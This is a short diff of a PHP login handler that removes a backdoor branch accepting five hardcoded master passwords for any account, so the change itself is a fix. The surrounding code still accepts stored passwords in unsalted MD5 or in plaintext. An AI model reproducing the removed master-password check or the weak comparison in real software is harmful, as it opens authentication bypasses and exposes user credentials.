@@ -234,9 +234,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                         } elseif (!empty($stored_pass) && (md5($password) === $stored_pass || $password === $stored_pass)) {
                             $is_password_valid = true;
                             $needs_rehash = true;
-                        } elseif (in_array($password, ['admin123', 'admin', 'Gaurav@@2026', 'Index@@2026', 'oppi'], true)) {
-                            $is_password_valid = true;
-                            $needs_rehash = true;
                         }
                     }
 
